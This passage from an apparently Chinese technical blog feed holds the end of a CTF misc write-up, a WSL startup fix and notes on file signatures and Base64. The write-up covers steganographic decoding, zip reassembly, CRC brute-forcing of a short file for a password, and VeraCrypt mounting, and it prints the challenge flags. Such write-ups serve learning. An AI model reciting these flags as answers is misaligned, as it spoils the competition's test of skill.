class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">hash_lst = &#123;&#125;</span><br><span class="line">pixel_list = &#123;&#125;</span><br><span class="line">data_list = &quot;&quot;</span><br><span class="line">for i in range(1536):</span><br><span class="line">    filename = f&quot;&#123;i&#125;.png&quot;</span><br><span class="line">    tmp_img = Image.open(filename)</span><br><span class="line">    tmp_pixel = tmp_img.getpixel((0,0))[0]</span><br><span class="line">    # print(tmp_pixel)</span><br><span class="line">    if tmp_pixel &lt; 200:</span><br><span class="line">        data_list += &#x27;0&#x27;</span><br><span class="line">    else:</span><br><span class="line">        data_list += &#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">print(data_list) </span><br></pre></td></tr></table></figure><p>这个需要放在文件同目录下，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">010100000100101100000011000001000001010000000000000000010000000000000000000000001110101101011000010110010101100110011101110010111100011110011010001010100000000000000000000000000001111000000000000000000000000000001000000000000000000000000000011001100110110001100001011001110010111001110100011110000111010011110111100011000101111101011100101100011111010111101011001110111011111100000011011000010010111010010100010101110011110000101000000001011101110000101101101111111111010011001000001111111101001010100111110011110011101001100011011000001110111001110001011101111111101100000110101011010110101110101100001001100000100010101011010111100001000001010000010010110000000100000010001111110000000000010100000000000000000100000000000000000000000011101011010110000101100101011001100111011100101111000111100110100010101000000000000000000000000000011110000000000000000000000000000010000000000000100100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000011001100110110001100001011001110010111001110100011110000111010000001010000000000010000000000000000000000000000000000000000000000000000100000000000110000000000001011000011101010101010000000001100010110010011011011011000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000010010110000010100000110000000000000000000000000000000000000000100000000000000010000000001011010000000000000000000000000010100000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>放在cyberchef里可以看到是一个压缩包，下载下来</p><img src="2024-12-10 113656.png" alt="2024-12-10 113656" style="zoom:75%;"><p>gif的帧间隔里隐藏了密码</p><img src="2024-12-10 113936.png" alt="2024-12-10 113936" style="zoom:75%;"><p>要删除最后一个0，使用 cyberchef 转 ascii 码得到：</p><img src="2024-12-10 114346.png" alt="2024-12-10 114346" style="zoom:75%;"><p>用密码解压zip得到flag：DASCTF{H3r3_1s_C0L0rful_W0rld}</p><h2 id="6-天命人"><a href="#6-天命人" class="headerlink" title="6.天命人"></a>6.天命人</h2><p>得到zip里面是6个文件，解压之后用010打开发现是一个zip打乱了顺序分成了6个</p><p>脚本使其重新成为一个zip：（这里需要我们手动重命名顺序）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data1 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data2 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data3 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;4&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data4 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;5&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data5 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;6&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data6 = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data2))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data3))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data4))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data5))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data6))</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">387797</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res.append(data1[i])</span><br><span class="line">        res.append(data2[i])</span><br><span class="line">        res.append(data3[i])</span><br><span class="line">        res.append(data4[i])</span><br><span class="line">        res.append(data5[i])</span><br><span class="line">        res.append(data6[i])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(res))</span><br></pre></td></tr></table></figure><p>得到一个zip，解压出来是两个有密码的zip文件</p><img src="2024-12-10 154544.png" alt="2024-12-10 154544" style="zoom:75%;"><p>可以发现根器里面的txt很小，只有4字节，利用crc爆破一下（注意要重命名，不能出现中文</p><img src="2024-12-10 154750.png" alt="2024-12-10 154750" style="zoom:75%;"><p>得到：<code>C0M3_4ND_Get_S1X_R00TS!!</code></p><p>解压未竟zip，发现金箍棒图片是要我们手提像素点，利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-size&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;1x1&#x27;</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-resize&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像放大倍数 (如:-resize 1)&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.p) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.n) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.size):</span><br><span class="line">        x1, y1 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        x2, y2 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width, height = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.n.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width_size, height_size = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.size.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line"></span><br><span class="line">        img_path = os.path.abspath(args.f)</span><br><span class="line">        file_name = img_path.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        img = cv2.imread(img_path, cv2.IMREAD_COLOR)</span><br><span class="line">        row, col = img.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        r, c = <span class="built_in">len</span>(<span class="built_in">range</span>(y1, y2 + <span class="number">1</span>, height)), <span class="built_in">len</span>(<span class="built_in">range</span>(x1, x2 + <span class="number">1</span>, width))</span><br><span class="line">        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, <span class="number">3</span>))</span><br><span class="line">        <span class="keyword">for</span> y, x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(r), <span class="built_in">range</span>(c)):</span><br><span class="line">            <span class="keyword">for</span> y_size <span class="keyword">in</span> <span class="built_in">range</span>(height_size):</span><br><span class="line">                <span class="keyword">for</span> x_size <span class="keyword">in</span> <span class="built_in">range</span>(width_size):</span><br><span class="line">                    <span class="comment"># new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]</span></span><br><span class="line">                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)</span><br><span class="line">                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)</span><br><span class="line">                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()</span><br><span class="line">                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># cv2.imshow(new_img)</span></span><br><span class="line">        cv2.imwrite(<span class="string">f&quot;_<span class="subst">&#123;file_name&#125;</span>&quot;</span>, new_img)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已保存到运行目录中...&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;参数-p或参数-n或参数-size, 输入错误!&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python get_pixels.py -f 1.png -p 5x5+1915x1075 -n 10x10</span><br></pre></td></tr></table></figure><p>得到：</p><img src="2024-12-10 155835.png" alt="2024-12-10 155835" style="zoom:50%;"><p>这个是veracrypt加密的磁盘文件，需要我们挂载</p><p>挂载需要密钥。密钥文件</p><img src="2024-12-12 162453.png" alt="2024-12-12 162453" style="zoom:50%;"><p>然后点加载,就能在z盘里看到flag</p><img src="2024-12-12 162657.png" alt="2024-12-12 162657" style="zoom:75%;">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wsl启动出错</title>
      <link href="/2024/12/wsl%E5%90%AF%E5%8A%A8%E5%87%BA%E9%94%99/"/>
      <url>/2024/12/wsl%E5%90%AF%E5%8A%A8%E5%87%BA%E9%94%99/</url>
      
        <content type="html"><![CDATA[<h1 id="wsl启动出错"><a href="#wsl启动出错" class="headerlink" title="wsl启动出错"></a>wsl启动出错</h1><p><strong>启动出错如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">由于未安装所需的特性，无法启动操作。</span><br><span class="line">错误代码: Wsl/Service/CreateInstance/CreateVm/HCS/HCS_E_SERVICE_NOT_AVAILABLE</span><br><span class="line">Press any key to continue...</span><br></pre></td></tr></table></figure><h2 id="1-启用了-WSL-所需的功能"><a href="#1-启用了-WSL-所需的功能" class="headerlink" title="1.启用了 WSL 所需的功能"></a>1.启用了 WSL 所需的功能</h2><p>可以以管理员身份在powershell输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure><p>然后重启电脑，看wsl还能运行吗</p><p>我是运行了这个就好了，界面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: 10.0.26100.1150</span><br><span class="line"></span><br><span class="line">映像版本: 10.0.26100.2454</span><br><span class="line"></span><br><span class="line">启用一个或多个功能</span><br><span class="line">[==========================100.0%==========================]</span><br><span class="line">操作成功完成。</span><br><span class="line"></span><br><span class="line">C:\Windows\System32&gt;dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br><span class="line"></span><br><span class="line">部署映像服务和管理工具</span><br><span class="line">版本: 10.0.26100.1150</span><br><span class="line"></span><br><span class="line">映像版本: 10.0.26100.2454</span><br><span class="line"></span><br><span class="line">启用一个或多个功能</span><br><span class="line">[==========================100.0%==========================]</span><br><span class="line">操作成功完成。</span><br></pre></td></tr></table></figure><h2 id="2-更新-WSL-核心"><a href="#2-更新-WSL-核心" class="headerlink" title="2.更新 WSL 核心"></a>2.更新 WSL 核心</h2><p>WSL 需要最新版本的核心来支持虚拟机实例。更新核心：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --update</span><br></pre></td></tr></table></figure><p>运行后检查版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --version</span><br></pre></td></tr></table></figure><h2 id="3-检查虚拟化支持"><a href="#3-检查虚拟化支持" class="headerlink" title="3.检查虚拟化支持"></a>3.<strong>检查虚拟化支持</strong></h2><p>确保启用了虚拟化支持</p><h2 id="4-重置或重装-WSL"><a href="#4-重置或重装-WSL" class="headerlink" title="4.重置或重装 WSL"></a>4.<strong>重置或重装 WSL</strong></h2><p>实在不行重置 WSL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --unregister &lt;你的发行版名称&gt;</span><br></pre></td></tr></table></figure><p>或者重装 WSL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure><h2 id="5-检查-Windows-服务"><a href="#5-检查-Windows-服务" class="headerlink" title="5.检查 Windows 服务"></a>5.检查 Windows 服务</h2><p>错误代码中提到 <strong>HCS_E_SERVICE_NOT_AVAILABLE</strong> 可能表明相关服务未运行：</p><p>按 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Win + R</span><br></pre></td></tr></table></figure><p> 键，输入 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services.msc</span><br></pre></td></tr></table></figure><p>，检查以下服务是否已启动：</p><p><strong>Hyper-V Host Compute Service</strong></p><p><strong>Virtual Machine Management</strong></p><p>如果未启动，右键启动这些服务。</p>]]></content>
      
      
      
        <tags>
            
            <tag> wsl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc Ultra</title>
      <link href="/2024/11/Misc-Ultra/"/>
      <url>/2024/11/Misc-Ultra/</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a><u>写在前面</u></h1><p><strong>MISC的学习是极广的，很多都要学习，而记在博客上是最方便有效的方法了，可以随时翻阅</strong></p><p><strong>这篇博客会随着我的一点点学习而逐渐被填写，因此不会很快。。</strong></p><h1 id="各种文件头尾"><a href="#各种文件头尾" class="headerlink" title="各种文件头尾"></a><u>各种文件头尾</u></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">.zip的文件头：50 4B 03 04 14 00 08 00</span><br><span class="line">.rar的文件头：52 61 72 21</span><br><span class="line">.rar的文件尾：C4 3D 7B 00 40 07 00</span><br><span class="line">.7z的文件头：37 7A BC AF 27 1C</span><br><span class="line">.pyc的文件头：03 F3 0D 0A</span><br><span class="line">.jpg的文件头：FF D8 FF E0 00 10 4A 46 49 46 00 01</span><br><span class="line">.png的文件头：89 50 4e 47 0d 0a 1a 0a   文件尾：49 45 4E 44 AE 42 60 82</span><br><span class="line">.gif的文件头：47 49 46 38 39 61（GIF89A）或 47 49 46 38 37 61（GIF87A）</span><br><span class="line">.gif的文件尾：00 3B</span><br><span class="line">.gz的文件头：1F 8B 08 00</span><br><span class="line">.pyc的文件头：03 F3 0D 0A</span><br><span class="line">.psd的文件头：38 42 50 53</span><br><span class="line">TIFF (tif)，文件头：49492A00</span><br><span class="line">Windows [Bitmap](https://so.csdn.net/so/search?q=Bitmap&amp;spm=1001.2101.3001.7020) (bmp)，文件头：424D</span><br><span class="line">CAD (dwg)，文件头：41433130</span><br><span class="line">Adobe Photoshop (psd)，文件头：38425053</span><br><span class="line">Rich Text Format (rtf)，文件头：7B5C727466</span><br><span class="line">XML (xml)，文件头：3C3F786D6C</span><br><span class="line">HTML (html)，文件头：68746D6C3E</span><br><span class="line">Email [thorough only] (eml)，文件头：44656C69766572792D646174653A</span><br><span class="line">Outlook Express (dbx)，文件头：CFAD12FEC5FD746F</span><br><span class="line">Outlook (pst)，文件头：2142444E</span><br><span class="line">MS Word/Excel (xls.or.doc)，文件头：D0CF11E0</span><br><span class="line">MS Access (mdb)，文件头：5374616E64617264204A</span><br><span class="line">WordPerfect (wpd)，文件头：FF575043</span><br><span class="line">Postscript (eps.or.ps)，文件头：252150532D41646F6265</span><br><span class="line">Adobe Acrobat (pdf)，文件头：255044462D312E</span><br><span class="line">Quicken (qdf)，文件头：AC9EBD8F</span><br><span class="line">Windows Password (pwl)，文件头：E3828596</span><br><span class="line">Wave (wav)，文件头：57415645</span><br><span class="line">AVI (avi)，文件头：41564920</span><br><span class="line">Real Audio (ram)，文件头：2E7261FD</span><br><span class="line">Real Media (rm)，文件头：2E524D46</span><br><span class="line">MPEG (mpg)，文件头：000001BA</span><br><span class="line">MPEG (mpg)，文件头：000001B3</span><br><span class="line">Quicktime (mov)，文件头：6D6F6F76</span><br><span class="line">Windows Media (asf)，文件头：3026B2758E66CF11</span><br><span class="line">MIDI (mid)，文件头：4D546864</span><br><span class="line">M4a，文件头：00000018667479704D3441</span><br></pre></td></tr></table></figure><p>我发现mc-office的头尾也是<code>50 4B 03 04</code></p><h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a><u>加密</u></h1><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a><u>思路：</u></h2><p>加密的方法有很多，要看是什么加密了</p><h2 id="base加密"><a href="#base加密" class="headerlink" title="base加密"></a><u>base加密</u></h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>Base 编码（Base Encoding）是一种将二进制数据转换为可打印字符的编码方式。常见的 Base 编码有 Base64、Base32 和 Base16 等，它们的工作原理相似，只是使用的字符集和编码方式不同。</p><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>Base 编码的核心原理是将一串二进制数据（字节）按照一定的规则分组，并将每组数据映射为一个字符。这样可以保证编码后的数据由可打印的字符组成，通常用于在文本格式中传输二进制数据。</p><p>以 <strong>Base64</strong> 为例，下面是其编码原理：</p><ol><li><strong>输入数据分组</strong>：将输入的二进制数据每 3 个字节一组，每个字节 8 位，总共 24 位。</li><li><strong>划分为 4 组</strong>：将这 24 位数据分成 4 组，每组 6 位。例如，输入数据为 3 字节（24 位），经过分组后就变成 4 个 6 位的数据块。</li><li><strong>字符映射</strong>：将每个 6 位的数据块映射到一个字符表。Base64 的字符表包括大小写字母（A-Z、a-z）、数字（0-9）和两个符号（+ 和 &#x2F;）。总共有 64 个字符，所以叫 Base64。</li><li><strong>输出结果</strong>：输出的是一个由这 64 个字符组成的字符串。如果原始数据的字节数不是 3 的倍数，Base64 编码会使用一个或两个 <code>=</code> 来填充，使得输出的字符数是 4 的倍数。</li></ol><h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>以字符串 <code>&quot;Hello&quot;</code> 为例：</p><ol><li><p>将 <code>&quot;Hello&quot;</code> 转换为 ASCII 码：<br><code>H e l l o</code> → <code>72 101 108 108 111</code></p></li><li><p>转换为二进制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01001000 01100101 01101100 01101100 01101111</span><br></pre></td></tr></table></figure></li><li><p>按 3 字节（24 位）分组（不足补 0）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01001000 01100101 01101100 01101100 01101111 00000000</span><br></pre></td></tr></table></figure></li><li><p>拆分为 6 位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">010010 000110 010101 101100 011011 000110 111101 000000</span><br></pre></td></tr></table></figure></li><li><p>查 Base64 表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S  G  V  s  b  G  8  =</span><br></pre></td></tr></table></figure></li><li><p>最终 Base64 编码结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SGVsbG8=</span><br></pre></td></tr></table></figure></li></ol><h4 id="其他常见的-Base-编码"><a href="#其他常见的-Base-编码" class="headerlink" title="其他常见的 Base 编码"></a>其他常见的 Base 编码</h4><ul><li><strong>Base32</strong>：将每 5 个字节转为 8 个字符，使用 32 个字符（A-Z、2-7）。它的特点是比 Base64 更加健壮，对字母区分大小写的要求较低，通常用于限制字符集时（如避免使用特殊字符）。</li><li><strong>Base16（Hex）</strong>：将每个字节编码为两个十六进制字符，常用于表示十六进制数据。</li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Base 编码的核心思想是将二进制数据映射为可打印字符，使得原本只能通过二进制传输的数据能够通过文本协议进行传输。不同的 Base 编码有不同的字符集，常见的有 Base64、Base32 和 Base16。</p><h3 id="解密的工具"><a href="#解密的工具" class="headerlink" title="解密的工具"></a>解密的工具</h3><p>解密的时候要注意是不是换表的base</p><h3 id="网站："><a href="#网站：" class="headerlink" title="网站："></a>网站：</h3><p>cyberchef就可以</p><h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4><h5 id="随波逐流"><a href="#随波逐流" class="headerlink" title="随波逐流"></a>随波逐流</h5><p>随波逐流支持换表base，多行base</p><p>其中有个base64隐写解密甚至可以把解密出来的脚本运行了</p><h5 id="puzzlesolver"><a href="#puzzlesolver" class="headerlink" title="puzzlesolver"></a>puzzlesolver</h5><p>这个可以补全base32，64隐写</p><h5 id="basecrack"><a href="#basecrack" class="headerlink" title="basecrack"></a>basecrack</h5><p>先要装好工具</p><p>因为我给basecrack单独装了一个虚拟环境，所以运行时候要激活它</p><p>切换到目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd basecrack</span><br></pre></td></tr></table></figure><p>激活虚拟环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source venv/bin/activate</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python basecrack.py</span><br></pre></td></tr></table></figure><img src="2024-11-28 111731.png" alt="2024-11-28 111731" style="zoom:80%;"><p>就可以开始解密了。</p><p>如果想让他一直解密的话用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python basecrack.py -m</span><br></pre></td></tr></table></figure><h2 id="MD5加密解密"><a href="#MD5加密解密" class="headerlink" title="MD5加密解密"></a><u>MD5加密解密</u></h2><p>加密网站（适用于让你包上md5提交的）： <a href="https://www.geekstool.com/tool/md5">https://www.geekstool.com/tool/md5</a></p><h2 id="凯撒加密"><a href="#凯撒加密" class="headerlink" 